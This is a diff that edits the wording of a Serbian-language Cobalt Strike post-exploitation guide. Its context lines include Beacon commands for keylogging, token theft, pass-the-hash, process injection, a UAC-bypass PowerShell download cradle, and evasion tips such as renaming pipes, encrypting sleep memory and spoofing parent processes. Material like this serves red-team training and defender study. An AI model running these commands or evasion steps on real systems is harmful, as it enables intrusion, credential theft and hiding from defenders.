@@ -45,7 +45,7 @@ execute-assembly </path/to/executable.exe>
 # Screenshots
 printscreen    # Napravite jedan screenshot putem PrintScr metode
 screenshot     # Napravite jedan screenshot
-screenwatch    # Pravite periodične screenshot-ove desktop-a
+screenwatch    # Pravite periodične screenshotove desktop-a
 ## Idite na View -> Screenshots da ih vidite
 
 # keylogger
@@ -81,12 +81,12 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 ## Steal token from pid
 ## Kao make_token ali krade token iz procesa
 steal_token [pid] # Takođe, ovo je korisno za mrežne akcije, ne lokalne akcije
-## Iz API dokumentacije znamo da ovaj tip prijave "omogućava pozivaocu da klonira svoj trenutni token". Zato Beacon izlaz kaže Impersonated <current_username> - impersonira naš vlastiti klonirani token.
+## Iz API dokumentacije znamo da ovaj tip prijave "omogućava pozivaocu da klonira svoj trenutni token". Zato izlaz Beacon-a kaže Impersonated <current_username> - impersonira naš vlastiti klonirani token.
 ls \\computer_name\c$ # Pokušajte da koristite generisani token za pristup C$ na računaru
 rev2self # Prestanite da koristite token iz steal_token
 
 ## Launch process with new credentials
-spawnas [domain\username] [password] [listener] #Učinite to iz direktorijuma sa pristupom za čitanje kao: cd C:\
+spawnas [domain\username] [password] [listener] #Uradite to iz direktorijuma sa pristupom za čitanje kao: cd C:\
 ## Kao make_token, ovo će generisati Windows događaj 4624: Račun je uspešno prijavljen, ali sa tipom prijave 2 (LOGON32_LOGON_INTERACTIVE). Detaljno će prikazati korisnika koji poziva (TargetUserName) i impersoniranog korisnika (TargetOutboundUserName).
 
 ## Inject into process
@@ -94,7 +94,7 @@ inject [pid] [x64|x86] [listener]
 ## Sa stanovišta OpSec: Ne vršite cross-platform injekciju osim ako zaista ne morate (npr. x86 -> x64 ili x64 -> x86).
 
 ## Pass the hash
-## Ovaj proces modifikacije zahteva patch-ovanje LSASS memorije što je visoko rizična akcija, zahteva lokalne administratorske privilegije i nije uvek izvodljivo ako je omogućena Protected Process Light (PPL).
+## Ovaj proces modifikacije zahteva patch-ovanje LSASS memorije što je visoko rizična akcija, zahteva lokalne administratorske privilegije i nije baš izvodljivo ako je omogućena Protected Process Light (PPL).
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
@@ -191,14 +191,14 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Execute-Assembly
 
-**`execute-assembly`** koristi **žrtvovani proces** koristeći daljinsku injekciju procesa za izvršavanje naznačenog programa. Ovo je veoma bučno jer se za injekciju unutar procesa koriste određeni Win API-ji koje svaki EDR proverava. Međutim, postoje neki prilagođeni alati koji se mogu koristiti za učitavanje nečega u istom procesu:
+**`execute-assembly`** koristi **žrtvovani proces** koristeći daljinsku injekciju procesa za izvršavanje naznačenog programa. Ovo je veoma bučno jer se za injekciju unutar procesa koriste određeni Win API-ji koje svaki EDR proverava. Međutim, postoje neki prilagođeni alati koji se mogu koristiti za učitavanje nečega u isti proces:
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 - U Cobalt Strike možete takođe koristiti BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 
-Agresor skripta `https://github.com/outflanknl/HelpColor` će kreirati komandu `helpx` u Cobalt Strike koja će obeležiti boje u komandama ukazujući da li su BOFs (zelena), ako su Frok&Run (žuta) i slično, ili ako su ProcessExecution, injekcija ili slično (crvena). Što pomaže da se zna koje komande su manje uočljive.
+Agressor skripta `https://github.com/outflanknl/HelpColor` će kreirati komandu `helpx` u Cobalt Strike koja će obojiti komande označavajući da li su BOFs (zelene), ako su Frok&Run (žute) i slično, ili ako su ProcessExecution, injekcija ili slično (crvene). Što pomaže da se zna koje su komande manje uočljive.
 
 ### Act as the user
 
@@ -206,14 +206,14 @@ Možete proveriti događaje kao što su `Seatbelt.exe LogonEvents ExplicitLogonE
 
 - Security EID 4624 - Proverite sve interaktivne prijave da biste znali uobičajene radne sate.
 - System EID 12,13 - Proverite učestalost gašenja/pokretanja/spavanja.
-- Security EID 4624/4625 - Proverite dolazne validne/invalidne NTLM pokušaje.
+- Security EID 4624/4625 - Proverite dolazne validne/nevalidne NTLM pokušaje.
 - Security EID 4648 - Ovaj događaj se kreira kada se koristi plaintext kredencijali za prijavu. Ako ga je proces generisao, binarni fajl potencijalno ima kredencijale u čistom tekstu u konfiguracionom fajlu ili unutar koda.
 
 Kada koristite `jump` iz cobalt strike, bolje je koristiti `wmi_msbuild` metodu da novi proces izgleda legitimnije.
 
 ### Use computer accounts
 
-Uobičajeno je da branioci proveravaju čudna ponašanja generisana od strane korisnika i **isključuju servisne naloge i račune računara kao `*$` iz svog nadzora**. Možete koristiti ove račune za lateralno kretanje ili eskalaciju privilegija.
+Uobičajeno je da branioci proveravaju čudna ponašanja generisana od strane korisnika i **isključuju servisne naloge i račune računara kao `*$` iz svog nadzora**. Možete koristiti ove račune za obavljanje lateralnog kretanja ili eskalaciju privilegija.
 
 ### Use stageless payloads
 
@@ -223,7 +223,7 @@ Stageless payloads su manje bučni od staged jer ne moraju da preuzmu drugu fazu
 
 Budite oprezni kada kradete ili generišete tokene jer može biti moguće da EDR enumeriše sve tokene svih niti i pronađe **token koji pripada drugom korisniku** ili čak SYSTEM-u u procesu.
 
-Ovo omogućava čuvanje tokena **po beacon-u** tako da nije potrebno ponovo krasti isti token iznova i iznova. Ovo je korisno za lateralno kretanje ili kada trebate koristiti ukradeni token više puta:
+Ovo omogućava skladištenje tokena **po beacon-u** tako da nije potrebno ponovo krasti isti token iznova i iznova. Ovo je korisno za lateralno kretanje ili kada trebate koristiti ukradeni token više puta:
 
 - token-store steal <pid>
 - token-store steal-and-use <pid>
@@ -238,7 +238,7 @@ Kada se krećete lateralno, obično je bolje **ukrasti token nego generisati nov
 
 Cobalt Strike ima funkciju pod nazivom **Guardrails** koja pomaže u sprečavanju korišćenja određenih komandi ili akcija koje bi mogle biti otkrivene od strane branioca. Guardrails se mogu konfigurisati da blokiraju specifične komande, kao što su `make_token`, `jump`, `remote-exec`, i druge koje se obično koriste za lateralno kretanje ili eskalaciju privilegija.
 
-Pored toga, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) takođe sadrži neke provere i ideje koje možete razmotriti pre nego što izvršite payload.
+Štaviše, repozitorij [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) takođe sadrži neke provere i ideje koje možete razmotriti pre nego što izvršite payload.
 
 ### Tickets encryption
 
@@ -246,9 +246,9 @@ U AD budite oprezni sa enkripcijom tiketa. Po defaultu, neki alati će koristiti
 
 ### Avoid Defaults
 
-Kada koristite Cobalt Strike, po defaultu SMB cevi će imati ime `msagent_####` i `"status_####`. Promenite ta imena. Moguće je proveriti imena postojećih cevi iz Cobalt Strike sa komandom: `ls \\.\pipe\`
+Kada koristite Cobalt Strike, po defaultu SMB cevi će imati ime `msagent_####` i `"status_####`. Promenite ta imena. Moguće je proveriti imena postojećih cevi iz Cobalt Strike-a sa komandom: `ls \\.\pipe\`
 
-Pored toga, sa SSH sesijama kreira se cev pod nazivom `\\.\pipe\postex_ssh_####`. Promenite je sa `set ssh_pipename "<new_name>";`.
+Štaviše, sa SSH sesijama kreira se cev pod nazivom `\\.\pipe\postex_ssh_####`. Promenite je sa `set ssh_pipename "<new_name>";`.
 
 Takođe u post-exploitation napadu cevi `\\.\pipe\postex_####` mogu biti modifikovane sa `set pipename "<new_name>"`.
 
@@ -264,19 +264,19 @@ U Cobalt Strike profilima takođe možete modifikovati stvari kao što su:
 
 ### Bypass memory scanning
 
-Neki EDR-ovi skeniraju memoriju za neke poznate malware potpise. Cobalt Strike omogućava modifikaciju funkcije `sleep_mask` kao BOF koja će moći da enkriptuje u memoriji backdoor.
+Neki EDR-i skeniraju memoriju za neke poznate malware potpise. Cobalt Strike omogućava modifikaciju funkcije `sleep_mask` kao BOF koja će moći da enkriptuje u memoriji backdoor.
 
 ### Noisy proc injections
 
-Kada injektujete kod u proces, ovo je obično veoma bučno, jer **ni jedan regularan proces obično ne vrši ovu akciju i zato su načini za to veoma ograničeni**. Stoga, može biti otkriveno od strane sistema za detekciju zasnovanih na ponašanju. Štaviše, može biti otkriveno i od strane EDR-ova koji skeniraju mrežu za **niti koje sadrže kod koji nije na disku** (iako procesi kao što su pregledači koji koriste JIT to obično imaju). Primer: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+Kada injektujete kod u proces, ovo je obično veoma bučno, jer **ni jedan regularan proces obično ne vrši ovu akciju i zato su načini za to veoma ograničeni**. Stoga, može biti otkriveno od strane sistema za detekciju zasnovanih na ponašanju. Štaviše, može biti otkriveno i od strane EDR-a koji skeniraju mrežu za **niti koje sadrže kod koji nije na disku** (iako procesi kao što su pregledači koristeći JIT to obično imaju). Primer: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
 
 ### Spawnas | PID and PPID relationships
 
 Kada pokrećete novi proces, važno je **održati regularan odnos roditelj-dete** između procesa kako biste izbegli detekciju. Ako svchost.exec izvršava iexplorer.exe, to će izgledati sumnjivo, jer svchost.exe nije roditelj iexplorer.exe u normalnom Windows okruženju.
 
-Kada se novi beacon pokrene u Cobalt Strike, po defaultu se kreira proces koji koristi **`rundll32.exe`** da pokrene novog slušatelja. Ovo nije veoma stealthy i može biti lako otkriveno od strane EDR-ova. Pored toga, `rundll32.exe` se pokreće bez argumenata što ga čini još sumnjivijim.
+Kada se novi beacon pokrene u Cobalt Strike, po defaultu se kreira proces koji koristi **`rundll32.exe`** da pokrene novog slušatelja. Ovo nije baš stealthy i može biti lako otkriveno od strane EDR-a. Štaviše, `rundll32.exe` se pokreće bez argumenata što ga čini još sumnjivijim.
 
-Sa sledećom Cobalt Strike komandom, možete odrediti drugačiji proces za pokretanje novog beacona, čineći ga manje detektabilnim:
+Sa sledećom Cobalt Strike komandom, možete odrediti drugačiji proces za pokretanje novog beacona, čineći ga manje uočljivim:
 ```bash
 spawnto x86 svchost.exe
 ```
